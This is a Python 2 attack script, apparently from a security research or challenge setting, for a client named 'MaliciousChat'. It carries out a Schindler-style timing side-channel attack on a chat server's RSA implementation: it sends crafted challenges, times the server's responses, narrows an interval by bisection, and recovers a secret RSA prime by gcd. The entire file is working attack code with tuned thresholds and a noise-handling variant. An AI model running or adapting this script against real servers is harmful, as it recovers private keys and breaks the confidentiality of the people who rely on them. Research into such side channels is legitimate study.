import sys
from math import sqrt, log, floor
from gmpy import invert, gcd
import os
import argparse
import logging
from malicious_client import MaliciousClient
import numpy
import time
import traceback

my_env = os.environ.copy()
my_env['JAVA_OPTS'] = '-Xint'

size_of_prime = 512
r = (1 << size_of_prime)
global logger

def compute_beta(n):
    return sqrt(n)/r

def compute_threshold(c_er, beta, n):
    return (-1)*c_er*beta*log(n,2)/16

def compute_RInv(n):
    return int(invert(1<<size_of_prime, n))



class MaliciousChat(object):
    def main(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('host', help = 'host to connect to')
        parser.add_argument('port', type=int, help='port')
        parser.add_argument('rsaPrimeFile', help='first RSA prime (or both if no second given)')
        parser.add_argument('--repeats', '-r', type=int, help='number of times a timing should be repeated', default = 20)
        parser.add_argument('--drops', '-d', type=int, help='number of timings dropped', default=3)
        parser.add_argument('--rsaPrime2File', '-p', default=None, help='second RSA prime')
        parser.add_argument('--printToScreen', '-s', action='store_true', help='print output to screen instead of logging')
        parser.add_argument('--answer', '-a', default=None, type=long, help='The prime that we are looking for.  Use for testing')
        parser.add_argument('--phase1', '-1', action='store_true', help='run phase 1 of the attack only.')
        parser.add_argument('--phase2', '-2', action='store_true', help='run phase 2 of the attack only.')
        parser.add_argument('--phase3', '-3', action='store_true', help='run phase 3 of the attack only.')
        parser.add_argument('--u1', type=long, help="override starting u1")
        parser.add_argument('--u2', type=long, help="override starting u2")

        args = parser.parse_args()

        self.m_finished = False
        self.name = 'bob'
        self.host = args.host
        self.port = args.port
        self.client = MaliciousClient(self.name, args.rsaPrimeFile, args.rsaPrime2File)
        drops = args.drops
        reps = args.repeats
        prime = args.answer

        self.connection = self.client.connect(self.host, self.port, self.handle)
        self.connected = True
        self.public_mod = self.connection.server_rsa_pk_long
        self.r_inv = compute_RInv(self.connection.server_rsa_pk_long)
        self.beta = compute_beta(self.public_mod)
        num_of_trials = 3

        logging.basicConfig(filename='output.log', level=logging.INFO)
        global logger
        logger = logging.getLogger(__name__)

        if args.printToScreen:
            handler = logging.StreamHandler(sys.stdout)
            logger.addHandler(handler)

        extra_reduction_time = 14500 #Computed on NUCs, should change for other platforms
        logger.info("reduction time " + str(extra_reduction_time))

        self.threshold = compute_threshold(extra_reduction_time, self.beta, self.public_mod)

        logger.info("Threshold is " + str(self.threshold))

        timings = 0
        self.num_observations = 0
        u1 = 0
        u2 = 0
        do_not_adjust_threshold = False


        if args.u1 and args.u2:
            logger.info("Override starting u1 and u2")
            u1 = args.u1
            u2 = args.u2
            self.threshold = 2*self.threshold 
            do_not_adjust_threshold = True

        total_start = time.time()

        if not args.phase2 and not args.phase3:
            logger.info("Starting Phase 1")
            #Phase 1
            u1, u2, timings = self.attack_phase1(reps, drops, num_of_trials, prime, u1, u2)
            if args.phase1:
                #print 'u1 = {}'.format(u1)
                #print 'u2 = {}'.format(u2)
                print "Found a good interval.  Success."
                return

        if not args.phase3:
            logger.info("Starting Phase 2")
            #Phase 2
            u1, u2, timings = self.attack_phase2(u1, u2, reps, drops, num_of_trials, timings, prime, do_not_adjust_threshold)
            if args.phase2:
                #print 'u1 = {}'.format(u1)
                #print 'u2 = {}'.format(u2)
                print "Found a good interval.  Success."
                return

        logger.info("Starting Phase 3")
        #Phase 3
        found_prime = self.attack_phase3(u1, u2)
        if args.phase3:
            return

        total_stop = time.time()

        logger.info("Attack complete in: {} seconds".format(total_stop - total_start))
        logger.info("Attack complete in: {} observations".format(self.num_observations))
        if found_prime != 1:
            return

        return

    def handle(self):
        print '.'

    def time_computation(self, u, repeats=1, drops=0):
        time_data = []
        for i in xrange(repeats):
            start = time.time()
            self.connection.create_and_send_malicious_challenge(u, self.r_inv, self.public_mod)
            response = self.connection.read_in_message()
            stop = time.time()
            self.num_observations += 1
            time_data.append(1000000000*(stop - start))
        time_data = time_data[drops:]
        median = numpy.median(time_data)
        std = numpy.std(time_data)
        for datum in time_data:
            if datum > median + std:
                time_data.remove(datum)
        return numpy.median(time_data)


    def compare_timing(self, midpoint, end, threshold, repeats=20, drops=5, num_of_trials=5, max_recursions=1, num_recursions=0):
        """
        Given an interval containing a start, midpoint, and end that contains a secret prime,
        we want to see if the prime is in the first half of the interval or the second half.
        If timing(end) - time(midpoint) > threshold,  the prime is in the first half of the interval. If the inequality
        is not true, the prime is in the second half of the interval.

        We check this inequality by running multiple trials where the outcome of each trial is whether or not
        the inequality is true. Each trial runs the timings "repeats" times and drops the first "drops" timings.
        :param midpoint: the start of the interval
        :param end: the end of the interval
        :param repeats: the number of times timings should be repeated for each trial
        :param drops: the number of timings that should be drops for each trial
        :param num_of_trials: the number of trials
        :return:
        """
	
        # store the outcome of the trials here
        # true is stored if timing(end) - timing(midpoint) > threshold
        trials = []
        for trial in range(0, num_of_trials):
            time1 = self.time_computation(end, repeats, drops)
            time2 = self.time_computation(midpoint, repeats, drops)
            logger.info("timing 1 " + str(time1))
            logger.info("timing 2 " + str(time2))
            logger.info("timing diff " + str(time1 - time2))

            if time1 - time2 > threshold:
                trials.append(True)
            else:
                trials.append(False)

        num_of_true = trials.count(True)
        num_of_false = trials.count(False)
        logger.info("num_of_true " + str(num_of_true))
        logger.info("num_of_false " + str(num_of_false))

        # we want all our results to be either true or false
        # if they aren't, run again
        if num_of_true > 0 and num_of_false > 0 :
	    if num_recursions < max_recursions:
              logger.info("Comparing inconclusive. Running the tests again.")
              return self.compare_timing(midpoint, end, threshold, repeats, drops, num_of_trials, max_recursions, num_recursions+1)

        
	diff = time1 - time2
	if (num_of_true > num_of_false):
            return diff, True
        else:
            return diff, False

    def attack_phase1(self, reps, drops, num_of_trials, prime=None, u1=0, u2=0, max_timings=3):
        delta = r >> 6
        if u1 == 0 or u2 == 0:
            u = int(floor(r*self.beta)) + 1
            u2 = u
            u1 = u2 - delta
        else:
            logger.info("Starting with:")
            logger.info("u1: {}".format(u1))
            logger.info("u2: {}".format(u2))

        timings = 0

        # When it takes threshold more time to compute time(u2) than time(u1), the interval {u_1 + 1, ...,u2} does NOT
        # contain one of the primes. So, we must look in the interval {u_1 - delta + 1, ..., u_1}.
        # Repeat this until we've found an interval that contains one of the primes.
        (timing_dif, comparison) = self.compare_timing(u1, u2, self.threshold, reps, drops, num_of_trials)
        while (comparison):
            if prime is not None:
                if u2 < prime:
                    logger.info("The interval has shifted below the prime. Attack failed")
                    raise Exception("Attack failed.")
            logger.info("u1 and u2")
            logger.info(u1)
            logger.info(u2)
            timings += 1
            if timings > max_timings:
                raise Exception("Exceeded maximum number of timings for phase1. Attack failed")
            logger.info("Phase 1 current number of timings: " + str(timings))
            u2 = u1
            u1 = u1 - delta
            (timing_dif, comparison) = self.compare_timing(u1, u2, self.threshold, reps, drops, num_of_trials)

        if prime is not None:
                if u2 < prime or u1 > prime:
                        logger.info("The chosen interval does not contain the prime.  Attack failed.")
                        raise Exception("Attack failed.")
        logger.info("timing_dif " + str(timing_dif))

        timings += 1
        logger.info("Phase 1 timings: " + str(timings))
        return u1, u2, timings

    def attack_phase2(self, u1, u2, reps, drops, num_of_trials, timings=0, prime=None, do_not_adjust_threshold=False):
        logger.info('u2 = ' + str(u2))
        logger.info('u1 = ' + str(u1))
        diff = 0;
        # reduce the size of the interval containing the multiple of the prime

        while (u2 - u1 > 1000):
            if prime is not None:
                if not ((u1 <= prime <= u2) or (u2 <= prime <= u1)):
                    logger.info("The interval no longer contains the prime. Attack failed.")
                    raise Exception("Attack failed.")

            this_threshold = self.threshold

            # The below is a variant on the classic Schindler attack discovered by CyberPoint
            # to make it work in a noisy environment. Ideally we would be able to provide
            # proof about why this threshold shift at this point improves the attack,
            # but for now, it has been demonstrated empirically.
            if timings > 30 and not do_not_adjust_threshold:
                this_threshold = 2*self.threshold

            u3 = (u1 + u2) // 2
            (diff, compares) = self.compare_timing(u3, u2, this_threshold, reps, drops, num_of_trials)
            if (compares):
                u2 = u3
            else:
                u1 = u3
            timings += 1
            logger.info('new u2: {}'.format(u2))
            logger.info('new u1: {}'.format(u1))
            logger.info("Current number of observations: " + str(self.num_observations))

        # check that the interval still contains the prime
        if prime is not None:
            if not ((u1 <= prime <= u2) or (u2 <= prime <= u1)):
                logger.info("The interval no longer contains the prime.  Attack failed.")
                raise Exception("Attack failed.")

	logger.info("u1 and u2 \n" + str(u1) + "\n" + str(u2))
        logger.info("timing diff " + str(diff))
        logger.info("Phase 1 + 2 timings:" + str(timings))
        return u1, u2, timings

    def attack_phase3(self,u1, u2):
        #Phase 3
        # compute gcd(u, public_mod) for every u in the interval found above
        success = False
        for i in range(u1+1, u2+1):
            g = int(gcd(i, self.public_mod))
            self.num_observations += 1
            if g != 1:
                success = True
                logger.info('Attack Succeeds!')
                logger.info('prime = ' + str(g))
                print 'Success!\nprime = {}'.format(g)
                break
        if not success:
            print 'Attack failed'
        return g

if __name__ == '__main__':
    chat = MaliciousChat()
    try:
        chat.main()
    except Exception as e:
        print str(e) # print the exception message
        sys.exit(1)
